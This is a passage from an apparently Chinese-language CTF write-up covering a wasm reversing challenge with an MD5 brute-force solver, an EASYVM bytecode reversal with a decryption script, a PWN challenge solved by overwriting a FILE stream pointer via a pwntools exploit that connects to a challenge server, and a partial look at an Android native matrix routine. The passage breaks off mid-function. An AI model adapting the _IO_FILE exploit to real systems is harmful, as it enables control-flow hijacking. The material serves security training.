0x65, 0x63, 0x33, 0x34, 0x38, 0x00, 0x66, 0x36, 0x30, 0x64, 0x37, 0x30, 0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38, 0x34, 0x39, 0x30, 0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64, 0x32, 0x66, 0x33, 0x62, 0x61, 0x00, 0x66, 0x63, 0x63, 0x39, 0x34, 0x61, 0x32, 0x30, 0x35, 0x39, 0x36, 0x66, 0x32, 0x36, 0x31, 0x39, 0x38, 0x36, 0x38, 0x66, 0x33, 0x61, 0x34, 0x62, 0x66, 0x35, 0x32, 0x65, 0x61, 0x64, 0x66, 0x37, 0x00, 0x64, 0x31, 0x36, 0x38, 0x63, 0x32, 0x31, 0x64, 0x31, 0x30, 0x33, 0x37, 0x31, 0x61, 0x35, 0x61, 0x62, 0x36, 0x31, 0x62, 0x63, 0x66, 0x65, 0x36, 0x63, 0x37, 0x35, 0x39, 0x65, 0x66, 0x36, 0x65, 0x00, 0x66, 0x36, 0x30, 0x64, 0x37, 0x30, 0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38, 0x34, 0x39, 0x30, 0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64, 0x32, 0x66, 0x33, 0x62, 0x61, 0x00, 0x31, 0x38, 0x33, 0x33, 0x34, 0x32, 0x39, 0x39, 0x37, 0x66, 0x66, 0x65, 0x64, 0x34, 0x62, 0x33, 0x31, 0x38, 0x39, 0x65, 0x39, 0x37, 0x37, 0x64, 0x30, 0x37, 0x37, 0x61, 0x36, 0x30, 0x62, 0x34, 0x00, 0x66, 0x34, 0x30, 0x34, 0x61, 0x33, 0x33, 0x36, 0x38, 0x64, 0x32, 0x64, 0x38, 0x66, 0x35, 0x37, 0x34, 0x36, 0x34, 0x66, 0x37, 0x33, 0x39, 0x64, 0x34, 0x65, 0x64, 0x30, 0x31, 0x63, 0x30, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0xa4, 0x6a, 0xd7, 0x56, 0xb7, 0xc7, 0xe8, 0xdb, 0x70, 0x20, 0x24, 0xee, 0xce, 0xbd, 0xc1, 0xaf, 0x0f, 0x7c, 0xf5, 0x2a, 0xc6, 0x87, 0x47, 0x13, 0x46, 0x30, 0xa8, 0x01, 0x95, 0x46, 0xfd, 0xd8, 0x98, 0x80, 0x69, 0xaf, 0xf7, 0x44, 0x8b, 0xb1, 0x5b, 0xff, 0xff, 0xbe, 0xd7, 0x5c, 0x89, 0x22, 0x11, 0x90, 0x6b, 0x93, 0x71, 0x98, 0xfd, 0x8e, 0x43, 0x79, 0xa6, 0x21, 0x08, 0xb4, 0x49, 0x62, 0x25, 0x1e, 0xf6, 0x40, 0xb3, 0x40, 0xc0, 0x51, 0x5a, 0x5e, 0x26, 0xaa, 0xc7, 0xb6, 0xe9, 0x5d, 0x10, 0x2f, 0xd6, 0x53, 0x14, 0x44, 0x02, 0x81, 0xe6, 0xa1, 0xd8, 0xc8, 0xfb, 0xd3, 0xe7, 0xe6, 0xcd, 0xe1, 0x21, 0xd6, 0x07, 0x37, 0xc3, 0x87, 0x0d, 0xd5, 0xf4, 0xed, 0x14, 0x5a, 0x45, 0x05, 0xe9, 0xe3, 0xa9, 0xf8, 0xa3, 0xef, 0xfc, 0xd9, 0x02, 0x6f, 0x67, 0x8a, 0x4c, 0x2a, 0x8d, 0x42, 0x39, 0xfa, 0xff, 0x81, 0xf6, 0x71, 0x87, 0x22, 0x61, 0x9d, 0x6d, 0x0c, 0x38, 0xe5, 0xfd, 0x44, 0xea, 0xbe, 0xa4, 0xa9, 0xcf, 0xde, 0x4b, 0x60, 0x4b, 0xbb, 0xf6, 0x70, 0xbc, 0xbf, 0xbe, 0xc6, 0x7e, 0x9b, 0x28, 0xfa, 0x27, 0xa1, 0xea, 0x85, 0x30, 0xef, 0xd4, 0x05, 0x1d, 0x88, 0x04, 0x39, 0xd0, 0xd4, 0xd9, 0xe5, 0x99, 0xdb, 0xe6, 0xf8, 0x7c, 0xa2, 0x1f, 0x65, 0x56, 0xac, 0xc4, 0x44, 0x22, 0x29, 0xf4, 0x97, 0xff, 0x2a, 0x43, 0xa7, 0x23, 0x94, 0xab, 0x39, 0xa0, 0x93, 0xfc, 0xc3, 0x59, 0x5b, 0x65, 0x92, 0xcc, 0x0c, 0x8f, 0x7d, 0xf4, 0xef, 0xff, 0xd1, 0x5d, 0x84, 0x85, 0x4f, 0x7e, 0xa8, 0x6f, 0xe0, 0xe6, 0x2c, 0xfe, 0x14, 0x43, 0x01, 0xa3, 0xa1, 0x11, 0x08, 0x4e, 0x82, 0x7e, 0x53, 0xf7, 0x35, 0xf2, 0x3a, 0xbd, 0xbb, 0xd2, 0xd7, 0x2a, 0x91, 0xd3, 0x86, 0xeb, 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x32, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, &#125;;...static void init_table(void) &#123; uint32_t offset; offset = (*Z_envZ_tableBaseZ_i); (*Z_envZ_table).data[offset + 0] = (wasm_rt_elem_t)&#123;func_types[6], (wasm_rt_anyfunc_t)(&amp;f11)&#125;; (*Z_envZ_table).data[offset + 1] = (wasm_rt_elem_t)&#123;func_types[1], (wasm_rt_anyfunc_t)(&amp;_to_bytes)&#125;; (*Z_envZ_table).data[offset + 2] = (wasm_rt_elem_t)&#123;func_types[2], (wasm_rt_anyfunc_t)(&amp;_to_int32)&#125;; (*Z_envZ_table).data[offset + 3] = (wasm_rt_elem_t)&#123;func_types[3], (wasm_rt_anyfunc_t)(&amp;_memcpy)&#125;; (*Z_envZ_table).data[offset + 4] = (wasm_rt_elem_t)&#123;func_types[3], (wasm_rt_anyfunc_t)(&amp;_memset)&#125;; (*Z_envZ_table).data[offset + 5] = (wasm_rt_elem_t)&#123;func_types[3], (wasm_rt_anyfunc_t)(&amp;_memcmp)&#125;; (*Z_envZ_table).data[offset + 6] = (wasm_rt_elem_t)&#123;func_types[2], (wasm_rt_anyfunc_t)(&amp;_strlen)&#125;; (*Z_envZ_table).data[offset + 7] = (wasm_rt_elem_t)&#123;func_types[4], (wasm_rt_anyfunc_t)(&amp;_md5)&#125;; (*Z_envZ_table).data[offset + 8] = (wasm_rt_elem_t)&#123;func_types[2], (wasm_rt_anyfunc_t)(&amp;_check)&#125;; (*Z_envZ_table).data[offset + 9] = (wasm_rt_elem_t)&#123;func_types[6], (wasm_rt_anyfunc_t)(&amp;f11)&#125;; (*Z_envZ_table).data[offset + 10] = (wasm_rt_elem_t)&#123;func_types[6], (wasm_rt_anyfunc_t)(&amp;f11)&#125;; (*Z_envZ_table).data[offset + 11] = (wasm_rt_elem_t)&#123;func_types[6], (wasm_rt_anyfunc_t)(&amp;f11)&#125;; (*Z_envZ_table).data[offset + 12] = (wasm_rt_elem_t)&#123;func_types[6], (wasm_rt_anyfunc_t)(&amp;f11)&#125;; (*Z_envZ_table).data[offset + 13] = (wasm_rt_elem_t)&#123;func_types[6], (wasm_rt_anyfunc_t)(&amp;f11)&#125;; (*Z_envZ_table).data[offset + 14] = (wasm_rt_elem_t)&#123;func_types[6], (wasm_rt_anyfunc_t)(&amp;f11)&#125;; (*Z_envZ_table).data[offset + 15] = (wasm_rt_elem_t)&#123;func_types[6], (wasm_rt_anyfunc_t)(&amp;f11)&#125;;&#125;...void WASM_RT_ADD_PREFIX(init)(void) &#123; init_func_types(); init_globals(); init_memory(); init_table(); init_exports();&#125; 转换成c代码后，审计起来还是很累。放一下pizza大佬的脚本： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import hashlibt = ['562fe3cc50014c260d9e8cf4ed38c77a','c022ad0cc0075a9ab14b412a1082d5f3','64c286cfc623aa8d7df7c088ebf7d718','83664bdee4b613b7e7a51b5213470a8d','b020bf598aaa2b3e03ed02c85436268a','4fdac5ac807506938103e775c50099ed','4fdac5ac807506938103e775c50099ed','c231d607b6823fd0a68e813760809754','d168c21d10371a5ab61bcfe6c759ef6e','f60d709ccf989d849028f97a03d2f3ba','a0184f8240e2fe46861dc8d15a819cb0','9dbec414336e741e9c73422df59de297','6fb5209d8fc8bb8507245bcfa24ae11f','6fb5209d8fc8bb8507245bcfa24ae11f','00c77fbc60a5bfc466d3d069876ec348','00c77fbc60a5bfc466d3d069876ec348','df33464fb471c46abaf691c000a0e30d','4fdac5ac807506938103e775c50099ed','f60d709ccf989d849028f97a03d2f3ba','fcc94a20596f2619868f3a4bf52eadf7','00c77fbc60a5bfc466d3d069876ec348','d168c21d10371a5ab61bcfe6c759ef6e','9dbec414336e741e9c73422df59de297','fcc94a20596f2619868f3a4bf52eadf7','9b37db091979bedf00a7095851ba6f59','00c77fbc60a5bfc466d3d069876ec348','f60d709ccf989d849028f97a03d2f3ba','fcc94a20596f2619868f3a4bf52eadf7','d168c21d10371a5ab61bcfe6c759ef6e','f60d709ccf989d849028f97a03d2f3ba','183342997ffed4b3189e977d077a60b4','f404a3368d2d8f57464f739d4ed01c0e']flag = ''for i in range(32): c = 0 for ch in range(32, 127): x = hashlib.md5('2333333333333333333333333333333' + chr(ch)).digest() x = x.encode('hex').lower() x = hashlib.md5(x).digest() x = x.encode('hex').lower() if(x == t[i]): c = ch break assert(c != 0) flag += chr(c)print flag EASYVM第一次做的时候手撸： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012020x05, 0x01, 0x0B, // mov r1, rB0x13, 0x03, 0x03, // xor r3, r30x13, 0x00, 0x00, // xor r0, r00x13, 0x04, 0x04, // xor r4, r4r1 = rB;r3 = r0 = r4 = 0;0x28, // enter the looploop:0x0C, 0x00, 0x33, // add r0, 0x330x14, 0x00, 0x20, // mov r0, r0 mod 0x200x05, 0x09, 0x01, // mov r9, r10x11, 0x09, 0x00, // add_pch r9, r00x0B, 0x0A, 0x09, // ldr_ch rA, r90x01, 0x04, 0x0A, // mov r4, rA0x1B, 0x05, 0x04, // push r5, r40x0C, 0x03, 0x01, // add r3, 0x010x24, 0x03, 0x20, // cmpl r3, 0x200x28, // jl loopwhile(1) // loop 0x20 times&#123; r0 += 0x33; r0 = r0 % 0x20; r9 = r1; r9 += r0; rA = r9; r4 = rA; r5 = r4 + 1; r3 += 0x01; if(r3 &gt;= 0x20) break;&#125;0x13, 0x00, 0x00, // xor r0, r00x07, 0x08, 0x05, // lea_int r8, r50x0E, 0x08, 0xE0, // add r8, 0xE00x07, 0x02, 0x08, // lea_int r2, r80x09, 0x0A, 0x02, // ldr_int rA, r20x01, 0x00, 0x0A, // mov r0, rA0x18, 0x00, 0xE0, // and r0, 0xE00x1E, 0x00, 0x05, // shr r0, 0x050x01, 0x04, 0x00, // mov r4, r00x13, 0x03, 0x03, // xor r3, r3r0 = 0;r8 = r5;r8 += 0xE0;r2 = r8;rA = r2;r0 = rA;r0 &amp;= 0xE0;r0 &gt;&gt;= 0x05;r0 &amp;= 0xFF;r4 = r0;r3 = 0;0x28, // enter the looploop:0x09, 0x0A, 0x02, // ldr_int rA, r20x01, 0x00, 0x0A, // mov r0, rA0x18, 0x00, 0x1F, // and r0, 0x1F0x20, 0x00, 0x03, // shl r0, 0x030x1B, 0x05, 0x00, // push r5, r00x07, 0x08, 0x05, // lea_int r8, r50x0E, 0x08, 0xE0, // add r8, 0xE00x07, 0x02, 0x08, // lea_int r2, r80x09, 0x0A, 0x02, // ldr_int rA, r20x01, 0x00, 0x0A, // mov, r0, rA0x18, 0x00, 0xE0, // and r0, 0xE00x1E, 0x00, 0x05, // shr r0, 0x050x1D, 0x05, 0x0A, // pop r5, rA0x0D, 0x0A, 0x00, // add rA, r00x1B, 0x05, 0x0A, // push r5, rA0x0C, 0x03, 0x01, // add r3, 0x010x24, 0x03, 0x1F, // cmpl r3, 0x1F0x28, // jl loopwhile(1) // loop 0x1F times&#123; rA = r2; r0 = rA; r0 &amp;= 0x1F; r0 &lt;&lt;= 0x03; r0 &amp;= 0xFF; r5 = r0 + 1; r8 = r5; r8 += 0xE0; r2 = r8; rA = r2; r0 = rA; r0 &amp;= 0xE0; r0 &gt;&gt;= 0x05; r0 &amp;= 0xFF; rA = r5 - 1; rA += r0; r5 = rA + 1; r3 += 1; if(r3 &gt;= 0x1F) break;&#125;0x09, 0x0A, 0x02, // ldr_int rA, r20x01, 0x00, 0x0A, // mov r0, rA0x18, 0x00, 0x1F, // and r0, 0x1F0x20, 0x00, 0x03, // shl r0, 0x030x0D, 0x00, 0x04, // add r0, r40x1B, 0x05, 0x00, // push r5, r00x13, 0x03, 0x03, // xor r3, r30x03, 0x04, 0x0D, // mov, r4, rD // 0xEFBEADDE0x28, // enter the looprA = r2;r0 = rA;r0 &amp;= 0x1F;r0 &lt;&lt;= 0x03;r0 &amp;= 0xFF;r0 += r4;r5 = r0 + 1;r3 = 0;r4 = rD;loop:0x07, 0x08, 0x05, // lea_int r8, r50x0E, 0x08, 0xE0, // add r8, 0xE00x07, 0x02, 0x08, // lea_int r2, r80x09, 0x0A, 0x02, // ldr_int rA, r20x01, 0x00, 0x0A, // mov, r0, rA0x1B, 0x05, 0x00, // push r5, r00x01, 0x00, 0x04, // mov r0, r40x0D, 0x00, 0x03, // and r0, r30x1D, 0x05, 0x0A, // pop r5, rA0x13, 0x0A, 0x00, // xor rA, r00x1B, 0x05, 0x0A, // push r5, rA0x22, 0x04, 0x08, // ror r4, 0x080x0C, 0x03, 0x01, // add r3, 0x010x24, 0x03, 0x20, // cmpl r3, 0x200x28, // jl loopwhile(1) // loop 0x20 times&#123; r8 = r5; r8 += 0xE0; r2 = r8; rA = r2; r0 = rA; r5 = r0 + 1; r0 = r4; r0 += r3; rA = r5 - 1; rA ^= r0; r5 = rA + 1; r4 = (1 &lt;&lt; 8 - 1) &amp; (r4 &lt;&lt; 24) + ((1 &lt;&lt; 24 - 1) &amp; (r4 &gt;&gt; 8)); r3 += 1; if(r3 &gt;= 0x20) break;&#125;0x13, 0x03, 0x03, // xor r3, r30x13, 0x04, 0x04, // xor r4, r40x05, 0x01, 0x0C, // mov r1, rC // enc0x28, // enter the loopr3 = r4 = 0;r1 = rC;loop:0x05, 0x09, 0x01, // mov r9, r10x11, 0x09, 0x03, // add_pch r9, r30x0B, 0x0A, 0x09, // ldr_ch rA, r90x01, 0x00, 0x0A, // mov r0, rA0x1B, 0x05, 0x00, // push r5, r00x07, 0x08, 0x05, // lea_int r8, r50x0E, 0x08, 0xDF, // add r8, 0xDF0x09, 0x0A, 0x08, // ldr_int rA, r80x1D, 0x05, 0x00, // pop r5, r00x1B, 0x05, 0x00, // push r5, r00x27, 0x00, 0x0A, // cmpeq r0, rA0x17, 0x04, 0x07, // mov r4, r4 | r70x0C, 0x03, 0x01, // add r3, 0x010x24, 0x03, 0x20, // cmpl r3, 0x200x28 // jl loopwhile(1) // loop 0x20 times&#123; r9 = r1; r9 += r3; rA = r9; r0 = rA; r5 = r0 + 1; r8 = r5; r8 += 0xDF; rA = r8; r0 = r5 - 1; r5 = r0 + 1; r0 != rA r4 |= r7; r3 += 1; if(r3 &gt;= 0x20) break;&#125; 其实还是挺清楚的，可以逆出来。脚本如下： 123456789101112131415161718192021# reverse step3enc1 = [0x75, 0x85, 0xD1, 0x39, 0x0B, 0x29, 0xCD, 0x77, 0x6D, 0x9F, 0x73, 0x23, 0x61, 0x8B, 0x4D, 0x45, 0x9D, 0x8F, 0x5B, 0x11, 0xC1, 0xC9, 0xE5, 0xCF, 0x45, 0xE5, 0xB1, 0xB3, 0x41, 0xD9, 0xCF, 0xCF]key = [0xDE, 0xAD, 0xBE, 0xEF]enc2 = [enc1[i] ^ ((key[i % 4] + i) &amp; 0xFF) for i in range(32)]# reverse step2enc3 = [0 for i in range(32)]def f(a, b): return ((a &lt;&lt; 5) &amp; 0xE0 | (b &gt;&gt; 3) &amp; 0x1F)for i in range(1, 32): enc3[i] = f(enc2[i - 1], enc2[i])enc3[0] = f(enc2[31], enc2[0])# reverse step1enc4 = [0 for i in range(32)]j = 0for i in range(32): j += 0x33 enc4[j % 0x20] = enc3[i]flag = ''for ch in enc4: flag += chr(ch)print flag 之后有空打算重新用脚本来整理一下 PWNChallenge1利用了_IO_FILE的相关漏洞，和之前一道练习题很类似： 123456789101112131415161718192021222324__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; int c; // [rsp+Ch] [rbp-4h] stream = fopen(\"test.txt\", \"r\"); init_func(); while ( 1 ) &#123; while ( 1 ) &#123; putchar('&gt;'); c = readline(); if ( c != 1 ) break; get_s(); &#125; if ( c != 2 ) break; put_s(); &#125; if ( c == 3 ) close_stream(); return 0LL;&#125; 输入的s可以覆盖掉stream指针，偏移是0x100。 1234.bss:00000000006010C0 s db 100h dup(?) ; DATA XREF: get_s+4↑o.bss:00000000006010C0 ; put_s+4↑o.bss:00000000006011C0 ; FILE *stream.bss:00000000006011C0 stream dq ? ; DATA XREF: close_stream+4↑r 关于_IO_FILE一些symbol在gdb里可以看： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263assassinq&gt;&gt; p sizeof(FILE)$1 = 0xd8assassinq&gt;&gt; p sizeof(struct _IO_FILE_plus)$2 = 0xe0assassinq&gt;&gt; p *(struct _IO_FILE_plus *)stdin$3 = &#123; file = &#123; _flags = 0xfbad208b, _IO_read_ptr = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, _IO_read_end = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, _IO_read_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\\n&quot;, _IO_write_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\\n&quot;, _IO_write_ptr = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\\n&quot;, _IO_write_end = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\\n&quot;, _IO_buf_base = 0x7ffff7dcfa83 &lt;_IO_2_1_stdin_+131&gt; &quot;\\n&quot;, _IO_buf_end = 0x7ffff7dcfa84 &lt;_IO_2_1_stdin_+132&gt; &quot;&quot;, _IO_save_base = 0x0, _IO_backup_base = 0x0, _IO_save_end = 0x0, _markers = 0x0, _chain = 0x0, _fileno = 0x0, _flags2 = 0x0, _old_offset = 0xffffffffffffffff, _cur_column = 0x0, _vtable_offset = 0x0, _shortbuf = &quot;\\n&quot;, _lock = 0x7ffff7dd18d0 &lt;_IO_stdfile_0_lock&gt;, _offset = 0xffffffffffffffff, _codecvt = 0x0, _wide_data = 0x7ffff7dcfae0 &lt;_IO_wide_data_0&gt;, _freeres_list = 0x0, _freeres_buf = 0x0, __pad5 = 0x0, _mode = 0xffffffff, _unused2 = &apos;\\000&apos; &lt;repeats 19 times&gt; &#125;, vtable = 0x7ffff7dcc2a0 &lt;_IO_file_jumps&gt;&#125;assassinq&gt;&gt; p *((struct _IO_FILE_plus *)stdin).vtable$4 = &#123; __dummy = 0x0, __dummy2 = 0x0, __finish = 0x7ffff7a70330 &lt;_IO_new_file_finish&gt;, __overflow = 0x7ffff7a71300 &lt;_IO_new_file_overflow&gt;, __underflow = 0x7ffff7a71020 &lt;_IO_new_file_underflow&gt;, __uflow = 0x7ffff7a723c0 &lt;__GI__IO_default_uflow&gt;, __pbackfail = 0x7ffff7a73c50 &lt;__GI__IO_default_pbackfail&gt;, __xsputn = 0x7ffff7a6f930 &lt;_IO_new_file_xsputn&gt;, __xsgetn = 0x7ffff7a6f590 &lt;__GI__IO_file_xsgetn&gt;, __seekoff = 0x7ffff7a6eb90 &lt;_IO_new_file_seekoff&gt;, __seekpos = 0x7ffff7a72990 &lt;_IO_default_seekpos&gt;, __setbuf = 0x7ffff7a6e850 &lt;_IO_new_file_setbuf&gt;, __sync = 0x7ffff7a6e6d0 &lt;_IO_new_file_sync&gt;, __doallocate = 0x7ffff7a62100 &lt;__GI__IO_file_doallocate&gt;, __read = 0x7ffff7a6f910 &lt;__GI__IO_file_read&gt;, __write = 0x7ffff7a6f190 &lt;_IO_new_file_write&gt;, __seek = 0x7ffff7a6e910 &lt;__GI__IO_file_seek&gt;, __close = 0x7ffff7a6e840 &lt;__GI__IO_file_close&gt;, __stat = 0x7ffff7a6f180 &lt;__GI__IO_file_stat&gt;, __showmanyc = 0x7ffff7a73dd0 &lt;_IO_default_showmanyc&gt;, __imbue = 0x7ffff7a73de0 &lt;_IO_default_imbue&gt;&#125; 脚本： 123456789101112131415161718192021222324#!/usr/bin/env pythonfrom pwn import *binary = './task_challenge1'elf = ELF(binary)context.log_level = 'debug'context.arch = elf.archcontext.terminal = ['tmux', 'splitw', '-h']local = 1if local: p = process(binary)else: p = remote('202.112.51.184', 30003)ub_offset = 0x3c4b30p.sendlineafter('&gt;', '1')gdb.attach(p)buf_addr = 0x6010C0system = 0x400897payload = ( ((('\\0' * 0x10 + p64(system) + '\\0' * 70).ljust(0x88,'\\0') + p64(buf_addr)).ljust(0xd8, '\\0') + p64(buf_addr)).ljust(0x100, '\\0') + p64(buf_addr))p.sendline(payload)p.sendlineafter('&gt;', '3')p.interactive() MOBILESWAG拖进jadx，直接看Mainactivity中的函数，可以知道对输入数据进行了长度的判断和内容的正则判断。然后还存在native层，需要对so文件分析。 在ida里能看出经过两次加密过程，仔细发现其实是矩阵的一些操作，先对矩阵转置： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101char **__fastcall matrix_transpos(char **matrix)&#123; char *v1; // x8 char *v2; // x11 char *v3; // x8 char *v4; // x8 char *v5; // x8 char *v6; // x8 char *v7; // x8 char *v8; // x9 char *v9; // x8 char *v10; // x9 char *v11; // x8 char *v12; // x9 char *v13; // x8 char *v14; // x9 char *v15; // x8 char *v16; // x9 char *v17; // x8 char *v18; // x9 char *v19; // x8 char *v20; // x9 char *v21; // x8 char *v22; // x9 char *v23; // x8 char *v24; // x9 char *v25; // x8 char *v26; // x9 v1 = matrix[1]; LODWORD(v2) = *((_DWORD *)*matrix + 1); *((_DWORD *)*matrix + 1) = *(_DWORD *)v1; *(_DWORD *)v1 = (_DWORD)v2; v3 = matrix[2]; LODWORD(v2) = *((_DWORD *)*matrix + 2); *((_DWORD *)*matrix + 2) = *(_DWORD *)v3; *(_DWORD *)v3 = (_DWORD)v2; v4 = matrix[3]; LODWORD(v2) = *((_DWORD *)*matrix + 3); *((_DWORD *)*matrix + 3) = *(_DWORD *)v4; *(_DWORD *)v4 = (_DWORD)v2; v5 = matrix[4]; LODWORD(v2) = *((_DWORD *)*matrix + 4); *((_DWORD *)*matrix + 4) = *(_DWORD *)v5; *(_DWORD *)v5 = (_DWORD)v2; v6 = matrix[5]; LODWORD(v2) = *((_DWORD *)*matrix + 5); *((_DWORD *)*matrix + 5) = *(_DWORD *)v6; *(_DWORD *)v6 = (_DWORD)v2; v8 = matrix[1]; v7 = matrix[2]; LODWORD(v2) = *((_DWORD *)v8 + 2); *((_DWORD *)v8 + 2) = *((_DWORD *)v7 + 1); *((_DWORD *)v7 + 1) = (_DWORD)v2; v9 = matrix[3]; v10 = matrix[1]; LODWORD(v2) = *((_DWORD *)v10 + 3); *((_DWORD *)v10 + 3) = *((_DWORD *)v9 + 1); *((_DWORD *)v9 + 1) = (_DWORD)v2; v11 = matrix[4]; v12 = matrix[1]; LODWORD(v2) = *((_DWORD *)v12 + 4); *((_DWORD *)v12 + 4) = *((_DWORD *)v11 + 1); *((_DWORD *)v11 + 1) = (_DWORD)v2; v13 = matrix[5]; v14 = matrix[1]; LODWORD(v2) = *((_DWORD *)v14 + 5); *((_DWORD *)v14 + 5) = *((_DWORD *)v13 + 1); *((_DWORD *)v13 + 1) = (_DWORD)v2; v16 = matrix[2]; v15 = matrix[3]; LODWORD(v2) = *((_DWORD *)v16 + 3); *((_DWORD *)v16 + 3) = *((_DWORD *)v15 + 2); *((_DWORD *)v15 + 2) = (_DWORD)v2; v17 = matrix[4]; v18 = matrix[2]; LODWORD(v2) = *((_DWORD *)v18 + 4); *((_DWORD *)v18 + 4) = *((_DWORD *)v17 + 2); *((_DWORD *)v17 + 2) = (_DWORD)v2; v19 = matrix[5]; v20 = matrix[2]; LODWORD(v2) = *((_DWORD *)v20 + 5); *((_DWORD *)v20 + 5) = *((_DWORD *)v19 + 2); *((_DWORD *)v19 + 2) = (_DWORD)v2; v22 = matrix[3]; v21 = matrix[4]; LODWORD(v2) = *((_DWORD *)v22 + 4); *((_DWORD *)v22 + 4) = *((_DWORD *)v21 + 3); *((_DWORD *)v21 + 3) = (_DWORD)v2; v23 = matrix[5]; v24 = matrix[3]; LODWORD(v2) = *((_DWORD *)v24 + 5); *((_DWORD *)v24 + 5) = *((_DWORD *)v23 + 3); *((_DWORD *)v23 + 3) = (_DWORD)v2; v26 = matrix[4]; v25 = matrix[5]; LODWORD(v2) = *((_DWORD *)v26 + 5); *((_DWORD *)v26 + 5) = *((_DWORD *)v25 + 4); *((_DWORD *)v25 + 4) = (_DWORD)v2; return matrix;&#125; 再将两个矩阵相乘： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546char *__fastcall matrix_inverse(char *matrix, char *data)&#123; char *v2; // x19 char *v3; // x22 char *v4; // x20 char *v5; // x21 char *v6; // x0 __int64 i; // x8 char *v8; // x9 char *v9; // x10 __int64 j; // x11 v2 = matrix; v3 = data; v4 = (char *)malloc(48LL); v5 = (char *)malloc(24LL); *(_QWORD *)v4 = v5; *((_QWORD *)v4 + 1) = malloc(24LL); *((_QWORD *)v4 + 2) = malloc(24LL); *((_QWORD *)v4 + 3) = malloc(24LL); *((_QWORD *)v4 + 4) = malloc(24LL); v6 = (char *)malloc(24LL); i = 0LL; *((_QWORD *)v4 + 5) = v6; while ( 1 ) &#123; v9 = *(char **)&amp;v2[8 * i]; j = 0LL; do &#123; v8 = v3 + 72; *(_DWORD *)&amp;v5[j] = *(_DWORD *)&amp;v8[j - 72] * *(_DWORD *)v9 + *(_DWORD *)&amp;v8[j - 48] * *((_DWORD *)v9 + 1) + *(_DWORD *)&amp;v8[j - 24] * *((_DWORD *)v9 + 2) + *(_DWORD *)&amp;v8[j] * *((_DWORD 